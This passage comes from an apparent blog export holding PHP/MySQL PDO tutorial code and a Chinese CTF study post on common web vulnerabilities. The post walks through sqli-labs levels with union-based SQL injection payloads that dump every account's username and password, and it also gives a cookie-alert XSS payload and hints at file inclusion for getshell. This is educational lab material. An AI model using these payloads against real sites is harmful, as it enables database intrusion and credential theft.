src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5%E5%BC%B9%E7%AA%97.png\" alt></p>\n<p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png\" alt></p>\n<p><strong>没有报错，所以利用session传递用户信息和连接数据库成功了。</strong></p>\n<h2 id=\"用PDO连接mysql数据库\"><a href=\"#用PDO连接mysql数据库\" class=\"headerlink\" title=\"用PDO连接mysql数据库\"></a>用PDO连接mysql数据库</h2><p>在Windows用pdo之前需要在php.ini里，将pdo拓展打开，具体方法是将# extension = php_pdo.dll这一行注释去掉(phpstudy已经做完了这一步)，然后需要连接哪种数据库就再去掉哪种数据库的注释。PDO(php database object)最大的优点就是可以连接不止mysql这一种数据库，比较方便的地方是可以使用异常类来处理程序运行时出现的问题，像下面代码可以将执行部分放在try{}模块中，发生异常直接获得信息，不用像上面sqli一样每次都判断一下执行是否成功</p>\n<pre><code class=\"php\">&lt;?php\n$servername = &quot;localhost&quot;;\n$username = &quot;root&quot;;\n$password = &quot;root&quot;;\n\ntry {\n    $conn = new PDO(&quot;mysql:host=$servername;&quot;, $username, $password);//建立连接对象\n    echo &quot;连接成功&quot;;\n}\ncatch(PDOException $e)\n{\n    echo $e-&gt;getMessage();\n}\n?&gt;</code></pre>\n<p>还是放到phpstudy的本地网站里，打开网站</p>\n<p>![](\\img\\pdo connect.png)</p>\n<h2 id=\"预处理语句及绑定参数\"><a href=\"#预处理语句及绑定参数\" class=\"headerlink\" title=\"预处理语句及绑定参数\"></a>预处理语句及绑定参数</h2><p>预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。</p>\n<p>预处理语句的工作原理如下：</p>\n<ol>\n<li><p>预处理：<strong>创建 SQL 语句模板</strong>并发送到数据库。预留的值使用参数 “<strong>?</strong>“ 标记 。例如：</p>\n<pre><code>INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</code></pre></li>\n<li><p>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。</p>\n</li>\n<li><p>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</p>\n</li>\n</ol>\n<p>相比于直接执行SQL语句，预处理语句有两个主要优点：</p>\n<ul>\n<li><p>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</p>\n</li>\n<li><p>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</p>\n</li>\n<li><p>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p>\n<h3 id=\"PDO-中的预处理语句\"><a href=\"#PDO-中的预处理语句\" class=\"headerlink\" title=\"PDO 中的预处理语句\"></a>PDO 中的预处理语句</h3><h4 id=\"实例-PDO-使用预处理语句\"><a href=\"#实例-PDO-使用预处理语句\" class=\"headerlink\" title=\"实例 (PDO 使用预处理语句)\"></a>实例 (PDO 使用预处理语句)</h4><pre><code class=\"php\">&lt;?php\n$servername = &quot;localhost&quot;;\n$username = &quot;root&quot;;\n$password = &quot;root&quot;;\n$dbname = &quot;myDBPDO&quot;;\n\ntry {\n    $conn = new PDO(&quot;mysql:host=$servername;dbname=$dbname&quot;, $username, $password);\n    // 设置 PDO 错误模式为异常\n    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n    // 预处理 SQL 并绑定参数\n    $stmt = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) \n    VALUES (:firstname, :lastname, :email)&quot;);\n    $stmt-&gt;bindParam(&#39;:firstname&#39;, $firstname);\n    $stmt-&gt;bindParam(&#39;:lastname&#39;, $lastname);\n    $stmt-&gt;bindParam(&#39;:email&#39;, $email);\n\n    // 插入多行数据\n    $firstname = &quot;John&quot;;\n    $lastname = &quot;Doe&quot;;\n    $email = &quot;john@example.com&quot;;\n    $stmt-&gt;execute();\n\n    $firstname = &quot;Mary&quot;;\n    $lastname = &quot;Moe&quot;;\n    $email = &quot;mary@example.com&quot;;\n    $stmt-&gt;execute();\n\n    $firstname = &quot;Julie&quot;;\n    $lastname = &quot;Dooley&quot;;\n    $email = &quot;julie@example.com&quot;;\n    $stmt-&gt;execute();\n\n    echo &quot;新记录插入成功&quot;;\n}\ncatch(PDOException $e)\n{\n    echo &quot;Error: &quot; . $e-&gt;getMessage();\n}\n$conn = null;\n?&gt;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"关闭连接\"><a href=\"#关闭连接\" class=\"headerlink\" title=\"关闭连接\"></a>关闭连接</h2><p>连接在脚本执行完后会自动关闭。但也可以使用以下代码来关闭连接：</p>\n<h4 id=\"实例-MySQLi-面向对象\"><a href=\"#实例-MySQLi-面向对象\" class=\"headerlink\" title=\"实例 (MySQLi - 面向对象)\"></a>实例 (MySQLi - 面向对象)</h4><pre><code class=\"php\">$conn-&gt;close();</code></pre>\n<h4 id=\"实例-MySQLi-面向过程\"><a href=\"#实例-MySQLi-面向过程\" class=\"headerlink\" title=\"实例 (MySQLi - 面向过程)\"></a>实例 (MySQLi - 面向过程)</h4><pre><code class=\"php\">mysqli_close($conn);</code></pre>\n<h4 id=\"实例-PDO\"><a href=\"#实例-PDO\" class=\"headerlink\" title=\"实例 (PDO)\"></a>实例 (PDO)</h4><pre><code class=\"php\">$conn = null;</code></pre>\n"},{"layout":"post","title":"常见漏洞原理","date":"2020-09-28T16:00:00.000Z","description":"挖挖挖","typora-root-url":"..","_content":"[toc]\n\n\n\n# 常见web漏洞\n\n## SQL注入 \n\nSQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。\n\n由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型\n\n> 按照注入点类型来分类\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。\n\n这一类的 SQL 语句原型大概为 `select * from 表名 where id=1 ` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。\n\n若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。\n\n此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n> 按照数据提交的方式来分类\n\n### （1）GET 注入\n\n提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/index.php?id=1 , id 是注入点。\n\n### （2）POST 注入\n\n使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。\n\n### （3）Cookie 注入\n\nHTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。\n\n### （4）HTTP 头部注入\n\n注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n\n> 按照执行效果来分类\n\n### （1）基于布尔的盲注\n\n即可以根据返回页面判断条件真假的注入。\n\n### （2）基于时间的盲注\n\n即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n### （3）基于报错注入\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n1. 单引号\n2. 双引号\n3. 基于数字型注入\n\n### （4）联合查询注入\n\n可以使用union的情况下的注入。\n\n### （5）堆查询注入\n\n可以同时执行多条语句的执行时的注入。\n\n### （6）宽字节注入\n\n宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）\n\n### 基于sqli-labs的实践操作\n\n#### 1.基于报错的GET sql注入\n\n##### less-1\n\n![](/img/less-1.png)\n\n提示说输入一个数字作为ID的值\n\n那么先在url输入?id=1\n\n![](/img/less-1输入id=1.png)\n\n显示查询成功，返回了用户Dumb\n\n然后尝试使其报错，输入 ?id=1'\n\n![](/img/less-1输入id-1'.png)\n\n报错了，显示为 ''1'' LIMIT 0,1'\n\n有了这个，我们就可以揣测一下网站后端的sql请求语句了\n\n首先，这个报错语句是被 ' ' 单引号闭合的，于是将其拆分 '   '1'' LIMIT 0,1   '，可知报错的段落是 '1'' LIMIT 0,1,由于我们输入的id值是1'\n\n,所以再拆分一下为'   1'   ' LIMIT 0,1\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"\n```\n\n id被单引号包裹，这是字符型注入点\n\n##### less-2\n\n![](/img/less-2.png)\n\n流程与上面差不多\n\n不同的是，这次输入id=1'后报错为 '' LIMIT 0,1'\n\n还是用和上面一样的方法拆分这段 ，'     ' LIMIT 0,1      '  -->' LIMIT 0,1\n\n可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id =$ id limit 0,1 \"\n```\n\nid没有被单引号包裹，这是一个数字型注入点\n\n##### less-3\n\n![](/img/less-3.png)\n\n这次的报错是 ''1'') LIMIT 0,1'\n\n拆分 '   '1'') LIMIT 0,1   '-->'1'') LIMIT 0,1-->'   *1'*   ') LIMIT 0,1\n\n显然，后台语句是\n\n```mysql\n\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"\n```\n\n但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了\n\n比如上面这个less-3\n\n我们试着把输入改为 id=1') --+或id=1') --%20\n\n![](/img/--+.png)\n\n\n\n![](/img/--%20.png)\n\n都成功了，这就说明后台语句和我们想的八九不离十了\n\n##### less-4\n\n这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被\"\"包裹了，输入的id值都会被当作字符串，加单引号括号都没用。\n\n那就使用\\来制造报错，输入 id=1\\\n\n返回报错 '\"1\\\\\") LIMIT 0,1'-->\"1\\\\\") LIMIT 0,1\n\n\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错\n\n合理推测：\n\n```mysql\n\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"\n```\n\n验证：\n\n![](/img/less-4.png)\n\n这样4种不同的注入点的后台语句就通过报错大致的试出来了\n\n之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等\n\n例如less-1(字符型) 就可以输入?id=1' order by 1(,2,3,4... ) --+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用\n\nless-1能够order by到3，也就是它有3个字段，于是接下来union注入\n\n我们要构造的语句是SELECT username,password FROM user WHERE id = '0' union select 1,2,3 --+ limit 0,1\n\n所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0' union select 1,2,3 --+\n\n这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果\n\n效果\n\n![](/img/union注入.png)\n\n可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用\n\n于是接下来注入 id=0' union select 1,user(),database() --+\n\n![](/img/union爆库.png)\n\n爆出了用户名和使用的数据库名\n\n然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入\n\n例如：\n\n爆表：\n\n```mysql\nid=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+\n```\n\n​\t\t\tinformation_schema是储存了所有数据库信息的库，tables储存了所有表信息的表\n\n![](/img/union爆表.png)\n\n看到了最后一个表是'users',可用于下一步爆字段\n\n爆字段：\n\n```mysql\nid=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+\n```\n\n![](/img/union爆字段.png)\n\n爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了\n\n```mysql\nid=0' union select 1,group_concat(username,0x3a,password),3 from users --+\n```\n\n![](img\\union爆出账号密码.png)\n\n好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了\n\n## 任意文件包含 \n\n网站服务器配置中的allow_url_fopen以及allow_url_include对文件包含的实现影响很大\n\n最常用的方式是在页面可以包含文件的情况下，用file://(本地文件包含) ,php://filter(input, memory,temp) ,data:// ,zip://系列 ,http://(远程文件包含)还有phar:// 等伪协议进行文件包含，进行传马，getshell等操作\n\n\n\n## XSS跨站请求 \n\n### 反射型(reflect)\n\n还没彻底整明白，以后再水\n\n### 储存型(store)\n\n还没彻底整明白，以后再水\n\n### DOM型\n\n上次招新赛就是DOM型，传入的username参数会被嵌入到返回页面的DOM中，直接嵌入\n\n```HTML\n<script>alert(document.cookie)</script>\n```\n\n直接弹出cookie\n\n## 文件上传\n\n重要基础知识\n\n```\n当客户端提交后，收到上传文件的页面获得了一个$_FILES 数组 \n\n$_FILES数组内容如下: \n$_FILES['myFile']['name'] 客户端文件的原名称。 \n$_FILES['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持。 \n$_FILES['myFile']['size'] 已上传文件的大小，单位为字节。 \n$_FILES['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 \n$_FILES['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) \n\nUPLOAD_ERR_OK \n值：0; 没有错误发生，文件上传成功。 \nUPLOAD_ERR_INI_SIZE \n值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 \nUPLOAD_ERR_FORM_SIZE \n值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 \nUPLOAD_ERR_PARTIAL \n值：3; 文件只有部分被上传。 \nUPLOAD_ERR_NO_FILE \n值：4; 没有文件被上传。 \n值：5; 上传文件大小为0. \n\n文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。\n```\n\n### PHP $_FILES中error返回值详解\n\n用PHP上传文件时，我们会用程序去监听浏览器发送过来的文件信息，首先会通 过$_FILES\\[fieldName]['error']的不同数值来判断此欲上传的文件状态是否正常。$_FILES[fieldName] ['error']==0代表一切正常，其它数值的具体含义请参考下面一段程序的注释部分\n\n$_FILES\\['file']['error']值 \n\nUPLOAD_ERR_OK: 0 //正常，上传成功 \n\nUPLOAD_ERR_INI_SIZE: 1 //上传文件大小超过服务器允许上传的最大值，php.ini中设置upload_max_filesize选项限制的值 \n\nUPLOAD_ERR_FORM_SIZE: 2 //上传文件大小超过HTML表单中隐藏域MAX_FILE_SIZE选项指定的值 \n\nUPLOAD_ERR_PARTIAL: 3 //文件只有部分被上传 \n\nUPLOAD_ERR_NO_FILE: 4 //没有文件被上传\n\nUPLOAD_ERR_NO_SIZE: 5//上传文件大小为0\n\nUPLOAD_ERR_NO_TMP_DIR: 6 //没有找不到临时文件夹 \n\nUPLOAD_ERR_CANT_WRITE: 7 //文件写入失败 \n\nUPLOAD_ERR_EXTENSION: 8 //php文件上传扩展没有打开 \n\n### PHP文件上传 move_uploaded_file() 参数的正确写法\n\n该函数的作用是把上传的文件移动到一个新的位置。因为前端文件上传之后是存在一个临时文件中，在脚本结束后，临时文件就会销毁，所以如果想要保存上传的文件，就需要使用move_uploaded_file()函数将文件转移到指定存放位置。\n有两个参数，第一个参数是你上传后的临时文件名，由系统自动生成。通常其名称在\n\n```\n$_FILE[\"file\"][\"tmp_name\"];\n```\n\n其中的file为你前台文件上传表单的名称(\"name\")。\n**第二个参数就是包含有路径的新的文件名**。如：\n\"upload/1.jpg\";\n这样，就会把你上传的文件，移动到当前目录下名称upload的子目录下，并把文件名保存为：1.jpg\n\n### php move_uploaded_file()介绍\n\nmove_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。\n\n**语法**\n\n```php\nmove_uploaded_file(filename,destination)\nmove_uploaded_file($_FILE[\"file\"][\"tmp_name\"],\"upload/\".$_FILE[\"file\"][\"name\"]) \n    //将临时文件拷贝到upload目录下的同名文件中\n```\n\n**参数** \n\n| 参数        | 描述                 |\n| ----------- | -------------------- |\n| filename    | 上传的文件的文件名。 |\n| destination | 移动文件到这个位置。 |\n\n**本函数检查并确保由 filename 指定的文件是合法的上传文件。如果文件合法，则将其移动到 destination指定的位置。**\n\n如果 filename 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。\n\n如果 filename 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。\n\n**注意**\n\n1. 本函数仅用于通过 HTTP POST 上传的文件。\n2. 如果目标文件已经存在，将会被覆盖。\n\n### move_uploaded_file()函数实例\n\n使用move_uploaded_file()函数上传文件到服务器。\n\n```php\n<?php\n     $tmp_filename = $_FILES['myupload']['tmp_name'];\n     if(!move_uploaded_file($tmp_filename,\"/path/to/dest/{$_FILES['myupload']['name']}\")) {\n          echo \"An error has occurred moving the uploaded file.<BR>\";\n          echo \"Please ensure that if safe_mode is on that the \" . \"UID PHP is using matches the file.\";\n          exit;\n     } else {\n          echo \"The file has been successfully uploaded!\";\n     }\n?>\n```","source":"_posts/2020-09-29-常见漏洞原理.md","raw":"---\nlayout: post\ntitle: 常见漏洞原理\ndate: 2020-9-29\ncategories: blog\ntags: [CTF,web]\ndescription: 挖挖挖\ntypora-root-url: ..\n---\n[toc]\n\n\n\n# 常见web漏洞\n\n## SQL注入 \n\nSQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。\n\n由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型\n\n> 按照注入点类型来分类\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。\n\n这一类的 SQL 语句原型大概为 `select * from 表名 where id=1 ` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。\n\n若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。\n\n此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n> 按照数据提交的方式来分类\n\n### （1）GET 注入\n\n提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/index.php?id=1 , id 是注入点。\n\n### （2）POST 注入\n\n使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。\n\n### （3）Cookie 注入\n\nHTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。\n\n### （4）HTTP 头部注入\n\n注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n\n> 按照执行效果来分类\n\n### （1）基于布尔的盲注\n\n即可以根据返回页面判断条件真假的注入。\n\n### （2）基于时间的盲注\n\n即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n### （3）基于报错注入\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n1. 单引号\n2. 双引号\n3. 基于数字型注入\n\n### （4）联合查询注入\n\n可以使用union的情况下的注入。\n\n### （5）堆查询注入\n\n可以同时执行多条语句的执行时的注入。\n\n### （6）宽字节注入\n\n宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）\n\n### 基于sqli-labs的实践操作\n\n#### 1.基于报错的GET sql注入\n\n##### less-1\n\n![](/img/less-1.png)\n\n提示说输入一个数字作为ID的值\n\n那么先在url输入?id=1\n\n![](/img/less-1输入id=1.png)\n\n显示查询成功，返回了用户Dumb\n\n然后尝试使其报错，输入 ?id=1'\n\n![](/img/less-1输入id-1'.png)\n\n报错了，显示为 ''1'' LIMIT 0,1'\n\n有了这个，我们就可以揣测一下网站后端的sql请求语句了\n\n首先，这个报错语句是被 ' ' 单引号闭合的，于是将其拆分 '   '1'' LIMIT 0,1   '，可知报错的段落是 '1'' LIMIT 0,1,由于我们输入的id值是1'\n\n,所以再拆分一下为'   1'   ' LIMIT 0,1\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"\n```\n\n id被单引号包裹，这是字符型注入点\n\n##### less-2\n\n![](/img/less-2.png)\n\n流程与上面差不多\n\n不同的是，这次输入id=1'后报错为 '' LIMIT 0,1'\n\n还是用和上面一样的方法拆分这段 ，'     ' LIMIT 0,1      '  -->' LIMIT 0,1\n\n可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id =$ id limit 0,1 \"\n```\n\nid没有被单引号包裹，这是一个数字型注入点\n\n##### less-3\n\n![](/img/less-3.png)\n\n这次的报错是 ''1'') LIMIT 0,1'\n\n拆分 '   '1'') LIMIT 0,1   '-->'1'') LIMIT 0,1-->'   *1'*   ') LIMIT 0,1\n\n显然，后台语句是\n\n```mysql\n\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"\n```\n\n但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了\n\n比如上面这个less-3\n\n我们试着把输入改为 id=1') --+或id=1') --%20\n\n![](/img/--+.png)\n\n\n\n![](/img/--%20.png)\n\n都成功了，这就说明后台语句和我们想的八九不离十了\n\n##### less-4\n\n这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被\"\"包裹了，输入的id值都会被当作字符串，加单引号括号都没用。\n\n那就使用\\来制造报错，输入 id=1\\\n\n返回报错 '\"1\\\\\") LIMIT 0,1'-->\"1\\\\\") LIMIT 0,1\n\n\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错\n\n合理推测：\n\n```mysql\n\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"\n```\n\n验证：\n\n![](/img/less-4.png)\n\n这样4种不同的注入点的后台语句就通过报错大致的试出来了\n\n之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等\n\n例如less-1(字符型) 就可以输入?id=1' order by 1(,2,3,4... ) --+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用\n\nless-1能够order by到3，也就是它有3个字段，于是接下来union注入\n\n我们要构造的语句是SELECT username,password FROM user WHERE id = '0' union select 1,2,3 --+ limit 0,1\n\n所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0' union select 1,2,3 --+\n\n这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果\n\n效果\n\n![](/img/union注入.png)\n\n可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用\n\n于是接下来注入 id=0' union select 1,user(),database() --+\n\n![](/img/union爆库.png)\n\n爆出了用户名和使用的数据库名\n\n然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入\n\n例如：\n\n爆表：\n\n```mysql\nid=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+\n```\n\n​\t\t\tinformation_schema是储存了所有数据库信息的库，tables储存了所有表信息的表\n\n![](/img/union爆表.png)\n\n看到了最后一个表是'users',可用于下一步爆字段\n\n爆字段：\n\n```mysql\nid=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+\n```\n\n![](/img/union爆字段.png)\n\n爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了\n\n```mysql\nid=0' union select 1,group_concat(username,0x3a,password),3 from users --+\n```\n\n![](img\\union爆出账号密码.png)\n\n好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了\n\n## 任意文件包含 \n\n网站服务器配置中的allow_url_fopen以及allow_url_include对文件包含的实现影响很大\n\n最常用的方式是在页面可以包含文件的情况下，用file://(本地文件包含) ,php://filter(input, memory,temp) ,data:// ,zip://系列 ,http://(远程文件包含)还有phar:// 等伪协议进行文件包含，进行传马，getshell等操作\n\n\n\n## XSS跨站请求 \n\n### 反射型(reflect)\n\n还没彻底整明白，以后再水\n\n### 储存型(store)\n\n还没彻底整明白，以后再水\n\n### DOM型\n\n上次招新赛就是DOM型，传入的username参数会被嵌入到返回页面的DOM中，直接嵌入\n\n```HTML\n<script>alert(document.cookie)</script>\n```\n\n直接弹出cookie\n\n## 文件上传\n\n重要基础知识\n\n```\n当客户端提交后，收到上传文件的页面获得了一个$_FILES 数组 \n\n$_FILES数组内容如下: \n$_FILES['myFile']['name'] 客户端文件的原名称。 \n$_FILES['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持。 \n$_FILES['myFile']['size'] 已上传文件的大小，单位为字节。 \n$_FILES['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 \n$_FILES['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) \n\nUPLOAD_ERR_OK \n值：0; 没有错误发生，文件上传成功。 \nUPLOAD_ERR_INI_SIZE \n值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 \nUPLOAD_ERR_FORM_SIZE \n值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 \nUPLOAD_ERR_PARTIAL \n值：3; 文件只有部分被上传。 \nUPLOAD_ERR_NO_FILE \n值：4; 没有文件被上传。 \n值：5; 上传文件大小为0. \n\n文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。\n```\n\n### PHP $_FILES中error返回值详解\n\n用PHP上传文件时，我们会用程序去监听浏览器发送过来的文件信息，首先会通 过$_FILES\\[fieldName]['error']的不同数值来判断此欲上传的文件状态是否正常。$_FILES[fieldName] ['error']==0代表一切正常，其它数值的具体含义请参考下面一段程序的注释部分\n\n$_FILES\\['file']['error']值 \n\nUPLOAD_ERR_OK: 0 //正常，上传成功 \n\nUPLOAD_ERR_INI_SIZE: 1 //上传文件大小超过服务器允许上传的最大值，php.ini中设置upload_max_filesize选项限制的值 \n\nUPLOAD_ERR_FORM_SIZE: 2 //上传文件大小超过HTML表单中隐藏域MAX_FILE_SIZE选项指定的值 \n\nUPLOAD_ERR_PARTIAL: 3 //文件只有部分被上传 \n\nUPLOAD_ERR_NO_FILE: 4 //没有文件被上传\n\nUPLOAD_ERR_NO_SIZE: 5//上传文件大小为0\n\nUPLOAD_ERR_NO_TMP_DIR: 6 //没有找不到临时文件夹 \n\nUPLOAD_ERR_CANT_WRITE: 7 //文件写入失败 \n\nUPLOAD_ERR_EXTENSION: 8 //php文件上传扩展没有打开 \n\n### PHP文件上传 move_uploaded_file() 